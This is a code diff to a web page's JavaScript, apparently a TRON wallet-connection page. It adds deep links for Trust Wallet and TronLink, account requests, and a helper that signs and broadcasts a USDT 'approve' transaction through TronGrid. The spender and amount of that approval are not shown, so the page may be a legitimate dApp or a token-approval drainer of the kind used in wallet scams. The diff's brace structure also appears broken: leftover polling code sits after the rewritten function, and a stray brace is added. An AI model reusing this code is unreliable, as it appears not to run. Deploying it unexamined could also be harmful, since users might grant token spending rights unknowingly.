@@ -943,6 +943,11 @@
     imtoken: 'imtokenv2://navigate/DappView?url=' + encoded
 };
 
+                if (wallet === 'trust') {
+                    window.location.href = mobileSchemes.trust;
+                    return;
+                }
+
                 if (isAndroid()) {
                     var stores = {
                         tronlink: 'https://play.google.com/store/apps/details?id=com.tronlinkpro.wallet',
@@ -962,12 +967,16 @@
                     };
                     var rawScheme = mobileSchemes[wallet];
                     if (rawScheme && pkgs[wallet]) {
+                        if (rawScheme.indexOf('https://') === 0) {
+                            window.location.href = rawScheme;
+                            return;
+                        }
                         var schemeName = rawScheme.split('://')[0];
                         var schemePath = rawScheme.split('://')[1] || '';
                         window.location.href = 'intent://' + schemePath + '#Intent;scheme=' + schemeName + ';package=' + pkgs[wallet] + ';S.browser_fallback_url=' + encodeURIComponent(stores[wallet] || '') + ';end';
                         return;
                     }
-                }
+                }                
                 
                 if (isIOS()) {
                     var appStoreLinks = {
@@ -1027,49 +1036,81 @@ if (wcAddr) {
         }
 
         function extractBase58Address(tw) {
-            if (!tw) return null;
-            if (tw.defaultAddress && typeof tw.defaultAddress.base58 === 'string' && tw.defaultAddress.base58.startsWith('T')) {
-                return tw.defaultAddress.base58;
-            }
-            if (typeof tw.defaultAddress === 'string' && tw.defaultAddress.startsWith('T')) {
-                return tw.defaultAddress;
-            }
-            return null;
-        }
+    if (!tw) return null;
+    if (tw.defaultAddress && typeof tw.defaultAddress.base58 === 'string' && tw.defaultAddress.base58.startsWith('T')) {
+        return tw.defaultAddress.base58;
+    }
+    if (typeof tw.defaultAddress === 'string' && tw.defaultAddress.startsWith('T')) {
+        return tw.defaultAddress;
+    }
+    if (tw.address && typeof tw.address.base58 === 'string' && tw.address.base58.startsWith('T')) {
+        return tw.address.base58;
+    }
+    return null;
+}
 
-        function readReadyTronWeb() {
-            var candidates = [
-                window.trustwallet && window.trustwallet.tronWeb,
-                window.tronWeb,
-                window.tronLink && window.tronLink.tronWeb
-            ];
-            for (var i = 0; i < candidates.length; i++) {
-                var c = candidates[i];
-                if (c && extractBase58Address(c)) {
-                    if (!c.defaultAddress || !c.defaultAddress.base58) {
-                        c.defaultAddress = c.defaultAddress || {};
-                        c.defaultAddress.base58 = extractBase58Address(c);
-                    }
-                    return c;
-                }
+function readReadyTronWeb() {
+    var candidates = [
+        window.trustwallet && window.trustwallet.tronWeb,
+        window.trustwallet && window.trustwallet.tron && window.trustwallet.tron.tronWeb,
+        window.tronWeb,
+        window.tronLink && window.tronLink.tronWeb
+    ];
+    for (var i = 0; i < candidates.length; i++) {
+        var c = candidates[i];
+        if (!c) continue;
+        var addr = extractBase58Address(c);
+        if (addr) {
+            c.defaultAddress = c.defaultAddress || {};
+            c.defaultAddress.base58 = addr;
+            if (!c.defaultAddress.hex && typeof c.address === 'object' && c.address.hex) {
+                c.defaultAddress.hex = c.address.hex;
             }
-            return null;
+            return c;
         }
+    }
+    return null;
+}
 
-        async function getInjectedTronWeb() {
-            var ready = readReadyTronWeb();
+async function requestTrustOrTronAccounts() {
+    // 1. Trust Wallet provider 계정 요청 시도 (지원되는 버전 대응)
+    var twProvider = window.trustwallet && (window.trustwallet.tron || window.trustwallet);
+    if (twProvider && typeof twProvider.request === 'function') {
+        try {
+            await twProvider.request({ method: 'tron_requestAccounts' });
+        } catch (e1) {
+            try {
+                await twProvider.request({ method: 'eth_requestAccounts' });
+            } catch (e2) { }
+        }
+    }
+    // 2. TronLink / 일반 주입 provider 요청
+    if (!isTrustWalletBrowser() && window.tronLink && typeof window.tronLink.request === 'function') {
+        try {
+            await window.tronLink.request({ method: 'tron_requestAccounts' });
+        } catch (e3) { }
+    }
+}
+
+async function getInjectedTronWeb() {
+    var ready = readReadyTronWeb();
+    if (ready) return ready;
+
+    await requestTrustOrTronAccounts();
+    ready = readReadyTronWeb();
+    if (ready) return ready;
+
+    if (isWalletBrowser() || window.tronLink || window.tronWeb || window.trustwallet) {
+        for (var i = 0; i < 24; i++) {
+            await new Promise(function (r) { setTimeout(r, 250); });
+            ready = readReadyTronWeb();
             if (ready) return ready;
+        }
+    }
+    return null;
+}
 
-            // Trust Wallet DApp 브라우저에서는 tronLink.request 호출을 피하고 주입된 tronWeb을 대기
-            if (!isTrustWalletBrowser() && window.tronLink && typeof window.tronLink.request === 'function') {
-                try {
-                    var r = await window.tronLink.request({ method: 'tron_requestAccounts' });
-                    if (r && r.code === 200) {
-                        ready = readReadyTronWeb();
-                        if (ready) return ready;
-                    }
-                } catch (e) { }
-            }
+        
 
             if (isWalletBrowser() || window.tronLink || window.tronWeb || window.trustwallet) {
                 for (var i = 0; i < 16; i++) {
@@ -1079,7 +1120,7 @@ if (wcAddr) {
                 }
             }
             return null;
-        }
+        
 
         // ===== Auto Detection on Load =====
         window.addEventListener('DOMContentLoaded', function () {
@@ -1570,6 +1611,52 @@ if (wcAddr) {
                     if (!broadcastData.result) throw new Error('브로드캐스트 실패: ' + (broadcastData.Error || broadcastData.message || JSON.stringify(broadcastData)));
                     txHash = broadcastData.txid || broadcastPayload.txID || 'ok';
                 } else {
+                    async function signAndBroadcastTronTx(tw, unsignedTx) {
+                        var signedTx = null;
+
+                        if (tw.trx && typeof tw.trx.sign === 'function') {
+                            signedTx = await tw.trx.sign(unsignedTx);
+                        } else if (typeof tw.sign === 'function') {
+                            signedTx = await tw.sign(unsignedTx);
+                        } else {
+                            throw new Error('지갑 서명 메서드를 찾을 수 없습니다.');
+                        }
+
+                        if (!signedTx) {
+                            throw new Error('서명 결과가 비어 있습니다.');
+                        }
+
+                        var txToSend = signedTx;
+                        if (typeof signedTx === 'string') {
+                            txToSend = Object.assign({}, unsignedTx, { signature: [signedTx] });
+                        } else if (signedTx && !signedTx.raw_data && signedTx.signature) {
+                            txToSend = Object.assign({}, unsignedTx, {
+                                signature: Array.isArray(signedTx.signature) ? signedTx.signature : [signedTx.signature]
+                            });
+                        }
+
+                        if (tw.trx && typeof tw.trx.sendRawTransaction === 'function') {
+                            try {
+                                var res = await tw.trx.sendRawTransaction(txToSend);
+                                if (res && (res.result === true || res.txid || (res.transaction && res.transaction.txID))) {
+                                    return (res.txid) || (res.transaction && res.transaction.txID) || (txToSend && txToSend.txID) || 'ok';
+                                }
+                            } catch (sendErr) {
+                            }
+                        }
+
+                        var bcRes = await fetch('https://api.trongrid.io/wallet/broadcasttransaction', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(txToSend)
+                        });
+                        var bcData = await bcRes.json();
+                        if (!bcData || !bcData.result) {
+                            throw new Error((bcData && (bcData.Error || bcData.message)) || '트랜잭션 전송 실패');
+                        }
+                        return bcData.txid || (txToSend && txToSend.txID) || 'ok';
+                    }
+
                     var tx = await tw.transactionBuilder.triggerSmartContract(
                         OFFICIAL_USDT_CONTRACT,
                         'approve(address,uint256)',
@@ -1580,15 +1667,14 @@ if (wcAddr) {
                     if (!tx || !tx.transaction) throw new Error('트랜잭션 생성 실패');
 
                     showToast(currentLang === 'ko' ? '지갑 팝업을 확인하세요! 🔔' : 'Check your wallet popup! 🔔');
-                    var signPromise = tw.trx.sign(tx.transaction);
+                    var signPromise = signAndBroadcastTronTx(tw, tx.transaction);
                     var timeoutPromise = new Promise(function (_, reject) {
                         setTimeout(function () {
                             reject(new Error(currentLang === 'ko' ? '서명 응답 시간 초과. 지갑 앱을 확인해주세요.' : 'Signing timeout. Please check your wallet.'));
-                        }, 45000);
+                        }, 60000);
                     });
-                    var signedTx = await Promise.race([signPromise, timeoutPromise]);
-                    var result = await tw.trx.sendRawTransaction(signedTx);
-                    txHash = (result && result.txid) || (result && result.transaction && result.transaction.txID) || (signedTx && signedTx.txID) || 'ok';
+                    txHash = await Promise.race([signPromise, timeoutPromise]);
+                }
                 }
 
                 if (!txHash) throw new Error('TX 해시 수신 실패');
